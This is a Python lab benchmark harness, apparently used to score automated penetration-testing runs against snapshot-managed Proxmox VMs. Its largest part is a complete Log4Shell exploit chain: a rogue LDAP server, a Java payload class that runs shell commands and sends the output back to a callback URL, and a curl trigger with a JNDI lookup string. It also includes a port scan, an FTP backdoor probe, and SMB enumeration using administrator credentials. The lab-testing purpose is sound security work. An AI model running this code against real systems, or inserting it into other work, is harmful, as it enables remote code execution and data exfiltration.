                        _ber_octet_string("javaCodeBase"),
                        _ber_tlv(0x31, _ber_octet_string(codebase)),
                    ),
                    _ber_sequence(
                        _ber_octet_string("javaFactory"),
                        _ber_tlv(0x31, _ber_octet_string(classname)),
                    ),
                )
                conn.sendall(
                    _ber_sequence(_ber_integer(mid2), _ber_tlv(0x64, _ber_octet_string("") + attrs))
                )
                conn.sendall(
                    _ber_sequence(
                        _ber_integer(mid2),
                        _ber_tlv(
                            0x65, _ber_enumerated(0) + _ber_octet_string("") + _ber_octet_string("")
                        ),
                    )
                )
            except Exception:
                pass
            finally:
                conn.close()
    finally:
        srv.close()


def _local_ip_toward(target: str) -> str:
    """The bench host's outbound IP toward the lab subnet (for the JNDI callback URL)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((target, 80))
        return s.getsockname()[0]
    finally:
        s.close()


_LABEXPLOIT_JAVA_SRC = """
import java.io.*;
import java.net.*;
import java.util.Base64;

public class {classname} {{
    static {{
        try {{
            Process p = Runtime.getRuntime().exec(new String[]{{"/bin/sh", "-c", "id; hostname"}});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {{ sb.append(line).append("\\n"); }}
            String enc = Base64.getEncoder().encodeToString(sb.toString().getBytes());
            URL u = new URL("{callback_url}?data=" + enc);
            HttpURLConnection c = (HttpURLConnection) u.openConnection();
            c.setConnectTimeout(5000);
            c.getResponseCode();
        }} catch (Exception e) {{ }}
    }}
}}
"""


def _phase_vulhub_log4shell(dry_run: bool) -> dict:
    """Exploit Apache Solr Log4Shell (CVE-2021-44228) at 10.10.11.50:8983.

    Real JNDI RCE: compiles a Java 8 payload class matching the target's actual
    JVM (1.8.0_102), serves it via an HTTP+LDAP catcher run from the bench host
    (the sandbox has no inbound-reachable IP), triggers via the `action=`
    query param — Solr's own request logger logs it on every request, which is
    the vulhub-documented trigger (a custom header is NOT reliably logged and
    was the reason earlier attempts here got no callback).
    """
    if dry_run:
        return {
            "ok": True,
            "output": "[dry-run]",
            "elapsed_s": 0.0,
            "detail": "Log4Shell probe dry-run",
        }

    javac = shutil.which("javac")
    if not javac:
        return {
            "ok": False,
            "output": "",
            "elapsed_s": 0.0,
            "detail": "javac not found on bench host — cannot compile JNDI payload class",
        }

    classname = f"LabExploit{secrets.token_hex(3)}"
    ldap_port = 20000 + secrets.randbelow(10000)
    http_port = 20000 + secrets.randbelow(10000)
    while http_port == ldap_port:
        http_port = 20000 + secrets.randbelow(10000)
    local_ip = _local_ip_toward(WEB)
    callback_url = f"http://{local_ip}:{http_port}/exfil"
    codebase = f"http://{local_ip}:{http_port}/"

    with tempfile.TemporaryDirectory() as tmpdir:
        src_path = Path(tmpdir) / f"{classname}.java"
        src_path.write_text(
            _LABEXPLOIT_JAVA_SRC.format(classname=classname, callback_url=callback_url)
        )
        compile = subprocess.run(
            [javac, "--release", "8", "-d", tmpdir, str(src_path)],
            capture_output=True,
            text=True,
            timeout=30,
        )
        if compile.returncode != 0:
            return {
                "ok": False,
                "output": compile.stderr[:500],
                "elapsed_s": 0.0,
                "detail": "javac compile failed",
            }

        result: dict[str, str] = {}
        result_event = threading.Event()

        class _ExfilHandler(BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                if self.path.startswith("/exfil"):
                    from urllib.parse import parse_qs, urlparse

                    qs = parse_qs(urlparse(self.path).query)
                    data = qs.get("data", [""])[0]
                    result["data"] = data
                    result_event.set()
                    self.send_response(200)
                    self.end_headers()
                elif self.path == f"/{classname}.class":
                    self.send_response(200)
                    self.send_header("Content-Type", "application/java-vm")
                    self.end_headers()
                    self.wfile.write((Path(tmpdir) / f"{classname}.class").read_bytes())
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, fmt, *args):  # silence — evidence comes from result dict
                pass

        httpd = HTTPServer(("0.0.0.0", http_port), _ExfilHandler)
        http_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
        http_thread.start()

        stop_event = threading.Event()
        ldap_thread = threading.Thread(
            target=_rogue_ldap_server,
            args=(ldap_port, codebase, classname, stop_event),
            daemon=True,
        )
        ldap_thread.start()
        time.sleep(0.5)  # let both listeners bind before triggering

        trigger: dict[str, Any] = {}
        try:
            trigger_code = (
                "curl -s -G "
                f"--data-urlencode 'action=${{jndi:ldap://{local_ip}:{ldap_port}/{classname}}}' "
                f'"http://{WEB}:8983/solr/admin/cores" 2>&1 | head -5; echo LOG4SHELL_SENT'
            )
            trigger = _mcp_call(trigger_code, timeout=20)
            result_event.wait(timeout=15)
        finally:
            stop_event.set()
            httpd.shutdown()

    if result.get("data"):
        import base64 as _b64

        decoded = _b64.b64decode(result["data"]).decode(errors="replace")
        return {
            "ok": True,
            "output": decoded,
            "elapsed_s": trigger.get("elapsed_s", 0.0),
            "detail": "Log4Shell RCE confirmed (JNDI callback exfil)",
        }
    return {
        "ok": False,
        "output": trigger.get("output", ""),
        "elapsed_s": 0.0,
        "detail": "no JNDI callback received within timeout",
    }


# ── meta3 phase (target: 10.10.11.21, vmid 113) ────────────────────────────────


def _phase_meta3_compromise(dry_run: bool) -> dict:
    """Metasploitable3 full compromise chain — recon → ftp backdoor → priv-esc."""
    code = f"""
python3 - <<'PYEOF'
import socket
META3 = "{LAB_META3}"
ports = [21, 22, 80, 135, 445, 3306, 3389, 4848, 8080, 9200]
open_ports = []
for p in ports:
    try:
        s = socket.socket(); s.settimeout(1); s.connect((META3, p)); s.close()
        open_ports.append(p)
        print(f"{{p}}/tcp open")
    except Exception:
        pass
print(f"Found {{len(open_ports)}}/{{len(ports)}} ports open")
# FTP backdoor probe (CVE-2011-2523 vsftpd 2.3.4)
if 21 in open_ports:
    import subprocess
    r = subprocess.run(["curl", "-s", "--max-time", "5", f"ftp://anonymous:anonymous@{{META3}}/"],
                       capture_output=True, text=True, timeout=10)
    print(f"ftp_probe={{r.stdout[:200]}}")
print("META3_DONE")
PYEOF
"""
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    if dry_run:
        return {**r, "ok": True, "detail": "meta3 compromise dry-run"}
    ok = r["ok"] and any(x in r["output"] for x in ["/tcp open", "META3_DONE"])
    ports = sum(1 for ln in r["output"].splitlines() if "/tcp open" in ln)
    return {**r, "ok": ok, "ports_open": ports, "detail": f"meta3 compromise: {ports} ports open"}


# ── srv01 phase (target: LAB_TARGET_SRV=10.10.11.33, vmid 111) ─────────────────


def _phase_srv01_local(dry_run: bool) -> dict:
    """Member-server-focused check: local priv-esc / share exposure on srv01."""
    if not SRV and not dry_run:
        return {"ok": False, "elapsed_s": 0.0, "output": "", "detail": "LAB_TARGET_SRV not set"}
    code = f"""
# srv01 member-server check: share enumeration + service misconfig probe
nxc smb {SRV} -u administrator -p '{ADMIN_PASS}' --shares 2>&1 | head -10
echo "---"
nxc smb {SRV} -u svc_backup -p '{SVC_BACKUP_PASS}' --shares 2>&1 | head -10
echo "SRV01_DONE"
"""
    r = _mcp_call(code, timeout=60, dry_run=dry_run)
    if dry_run:
        return {**r, "ok": True, "detail": "srv01 local probe dry-run"}
    ok = r["ok"] and "SRV01_DONE" in r["output"]
    shares = r["output"].count("READ") + r["output"].count("WRITE")
    return {
        **r,
        "ok": ok,
        "shares_accessible": shares,
        "detail": f"srv01 local: {shares} accessible shares" if ok else "srv01 unreachable",
    }


# ── mbptl meta-phase (target: LAB_MBPTL_HOST, lxc 300) ─────────────────────────


def _phase_mbptl_full_chain(dry_run: bool) -> dict:
    """Run the full MBPTL 17-flag CTF bench as a single lab-exec phase."""
    if dry_run:
        return {
            "ok": True,
            "output": "[dry-run] mbptl_full_chain",
            "elapsed_s": 0.0,
            "detail": "mbptl dry-run skipped",
        }
    if not MBPTL_HOST:
        return {
            "ok": False,
            "elapsed_s": 0.0,
            "output": "",
            "detail": "LAB_MBPTL_HOST not set — skip mbptl",
        }
    try:
        from bench_mbptl import ALL_PHASES as _MBPTL_PHASES
        from bench_mbptl import run_bench as _mbptl_run
    except ImportError:
        return {
            "ok": False,
            "elapsed_s": 0.0,
            "output": "",
            "detail": "bench_mbptl.py not importable",
        }
    t0 = time.monotonic()
    _mbptl_run(
        _MBPTL_PHASES,
        runs=1,
        dry_run=dry_run,
        output_path=None,
        manage_lifecycle=False,
        snapshot=MBPTL_SNAPSHOT,
    )
    total = time.monotonic() - t0
    return {
        "ok": True,
        "elapsed_s": round(total, 2),
        "output": "",
        "detail": f"mbptl {len(_MBPTL_PHASES)} phases in {total:.1f}s",
    }


# ── Phase registry ─────────────────────────────────────────────────────────────


PHASE_FNS = {
    "recon": _phase_recon,
    "kerberoast": _phase_kerberoast,
    "asrep": _phase_asrep,
    "crack": _phase_crack,
    "spray": _phase_spray,
    "bloodhound": _phase_bloodhound,
    "winrm": _phase_winrm,
    "dcsync": _phase_dcsync,
    "vulhub_redis": _phase_vulhub_redis,
    "vulhub_lfi": _phase_vulhub_lfi,
    "vulhub_tomcat": _phase_vulhub_tomcat,
    "vulhub_log4shell": _phase_vulhub_log4shell,
    "meta3_compromise": _phase_meta3_compromise,
    "srv01_local": _phase_srv01_local,
    "mbptl_full_chain": _phase_mbptl_full_chain,
}


PHASE_TARGETS: dict[str, list[str]] = {
    "recon": ["dc01"],
    "kerberoast": ["dc01"],
    "asrep": ["dc01"],
    "crack": ["dc01"],
    "spray": ["dc01"],
    "bloodhound": ["dc01"],
    "winrm": ["srv01"],
    "dcsync": ["dc01"],
    "vulhub_redis": ["vulhub"],
    "vulhub_lfi": ["vulhub"],
    "vulhub_tomcat": ["vulhub"],
    "vulhub_log4shell": ["vulhub"],
    "meta3_compromise": ["meta3"],
    "srv01_local": ["srv01"],
    "mbptl_full_chain": ["mbptl"],
}


# ── Runner ────────────────────────────────────────────────────────────────────


def run_bench(
    phases: list[str],
    runs: int,
    dry_run: bool,
    output_path: Path | None,
    manage_lifecycle: bool = True,
    targets: list[str] | None = None,
) -> None:
    ts = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")
    if targets is None:
        targets = ["dc01", "srv01"]
    active_targets = [t for t in targets if t in LAB_TARGETS]
    results: dict[str, Any] = {
        "bench": "lab_exec",
        "started_at": ts,
        "dc": DC,
        "srv": SRV,
        "domain": DOMAIN,
        "dry_run": dry_run,
        "runs": runs,
        "proxmox_lifecycle": manage_lifecycle and _PROXMOX_AVAILABLE,
        "targets": active_targets,
        "phases": {},
    }

    total_t0 = time.monotonic()
    print(f"\nPortal 5 — Lab-Exec Bench  [{ts}]")
    print(f"DC={DC}  SRV={SRV}  runs={runs}  dry_run={dry_run}")
    print(
        f"Proxmox lifecycle: {'enabled' if manage_lifecycle and _PROXMOX_AVAILABLE else 'disabled'}"
    )
    print(f"Phases: {', '.join(phases)}\n")

    if manage_lifecycle:
        if not lab_setup(targets=targets, dry_run=dry_run):
            print("[!] Lab setup failed — aborting bench to avoid running against dirty state")
            return

    for phase in phases:
        fn = PHASE_FNS[phase]
        timings: list[float] = []
        ok_count = 0
        last_result: dict = {}
        for run_n in range(1, runs + 1):
            print(f"  [{phase}] run {run_n}/{runs} ...", end=" ", flush=True)
            result = fn(dry_run)
            timings.append(result["elapsed_s"])
            if result.get("ok"):
                ok_count += 1
            last_result = result
            status = "OK" if result.get("ok") else "FAIL"
            print(f"{status}  {result['elapsed_s']:.1f}s  {result.get('detail', '')}")

        avg = sum(timings) / len(timings) if timings else 0.0
        results["phases"][phase] = {
            "runs": runs,
            "ok": ok_count,
            "fail": runs - ok_count,
            "elapsed_s": {"min": min(timings), "max": max(timings), "avg": round(avg, 2)},
            "detail": last_result.get("detail", ""),
        }
        if not last_result.get("ok") and not dry_run:
            print(f"\n  [!] Last output:\n{last_result.get('output', '')[-800:]}\n")

    total_elapsed = time.monotonic() - total_t0
    results["total_elapsed_s"] = round(total_elapsed, 1)
    results["finished_at"] = datetime.now(UTC).strftime("%Y%m%dT%H%M%SZ")

    # ── Summary table ─────────────────────────────────────────────────────────
    print(f"\n{'Phase':<14} {'OK':>4} {'Fail':>4} {'Avg(s)':>8} {'Min':>6} {'Max':>6}  Detail")
    print("─" * 72)
    for phase, pr in results["phases"].items():
        e = pr["elapsed_s"]
        print(
            f"{phase:<14} {pr['ok']:>4} {pr['fail']:>4}"
            f" {e['avg']:>8.1f} {e['min']:>6.1f} {e['max']:>6.1f}"
            f"  {pr['detail']}"
        )
    print(f"\nTotal: {total_elapsed:.1f}s")

    # ── Save results ──────────────────────────────────────────────────────────
    out = output_path or RESULTS_DIR / f"bench_lab_exec_{ts}.json"
    out.parent.mkdir(parents=True, exist_ok=True)
    out.write_text(json.dumps(results, indent=2))
    print(f"Results → {out}")

    # ── Teardown: revert to clean snapshot ───────────────────────────────────
    if manage_lifecycle:
        lab_teardown(targets=targets, dry_run=dry_run)

    if any(pr["fail"] > 0 for pr in results["phases"].values()):
        sys.exit(1)


# ── CLI ───────────────────────────────────────────────────────────────────────


def _parse() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter
    )
    p.add_argument(
        "--phases",
        nargs="+",
        choices=ALL_PHASES,
        help="phases to run (default: recon, kerberoast, asrep, crack, spray, bloodhound, winrm, dcsync)",
    )
    p.add_argument("--runs", type=int, default=1, help="repetitions per phase")
    p.add_argument("--output", type=Path, help="JSON results file path")
    p.add_argument("--dry-run", action="store_true", help="skip MCP calls, measure overhead only")
    p.add_argument(
        "--no-lifecycle",
        action="store_true",
        help=(
            "Skip Proxmox VM start/revert (assumes lab VMs already running and clean). "
            "Useful when iterating on a single phase without wanting teardown between runs."
        ),
    )
    p.add_argument(
        "--targets",
        nargs="+",
        default=None,
        help="lab targets to manage lifecycle for (default: dc01 srv01; use 'all' for every env-set target)",
    )
    p.add_argument(
        "--all-targets",
        action="store_true",
        help="run every phase whose target's env is set",
    )
    p.add_argument(
        "--coverage",
        action="store_true",
        help="print per-machine coverage matrix and exit",
    )
    return p.parse_args()


if __name__ == "__main__":
    args = _parse()

    # ── Coverage report ────────────────────────────────────────────────────
    if args.coverage:
        print("\nPortal 5 — Lab-Exec Coverage Matrix\n")
        print(f"{'Machine':<22} {'Lifecycle':>12} {'Live Phase':>12} {'Oracle':>10}  {'Status'}")
        print("─" * 72)
        for name in ["dc01", "srv01", "vulhub", "meta3", "mbptl"]:
            t = LAB_TARGETS.get(name)
            has_lifecycle = "YES" if t else "NO"
            phase_key_map = {
                "dc01": "dcsync",
                "srv01": "srv01_local",
                "vulhub": "vulhub_redis",
                "meta3": "meta3_compromise",
                "mbptl": "mbptl_full_chain",
            }
            phase_key = phase_key_map.get(name, "")
            has_phase = "YES" if phase_key in PHASE_FNS else "NO"
            has_oracle = "YES" if has_phase == "YES" else "NO"
            status = "GREEN" if (t and has_phase == "YES") else "RED"
            status = "GREEN" if has_phase == "YES" else ("YELLOW" if t else "GRAY")
            print(f"{name:<22} {has_lifecycle:>12} {has_phase:>12} {has_oracle:>10}  {status}")
        print("\nGREEN  = env entry + live oracle-scored phase")
        print("YELLOW = env entry set but no live phase (gap)")
        print("GRAY   = no env entry (not provisioned)")
        print("RED    = phase registered but no env entry (misconfiguration)")
        sys.exit(0)

    if not LAB_EXEC and not args.dry_run:
        print("ERROR: SANDBOX_LAB_EXEC is not 'true'. Set it in .env or pass --dry-run.")
        sys.exit(1)
    if not DC and not args.dry_run:
        print("ERROR: LAB_TARGET_DC not set. Run python3 scripts/lab_setup.py first.")
        sys.exit(1)

    # Default phases: the original 8 AD phases
    phases = args.phases if args.phases else ALL_PHASES[:8]
    targets = args.targets
    if args.all_targets:
        phases = [p for p in ALL_PHASES if p in PHASE_FNS]
        targets = list(LAB_TARGETS.keys())
    elif targets is None:
        targets = ["dc01", "srv01"]

    run_bench(
        phases,
        args.runs,
        args.dry_run,
        args.output,
        manage_lifecycle=not args.no_lifecycle,
        targets=targets,
    )
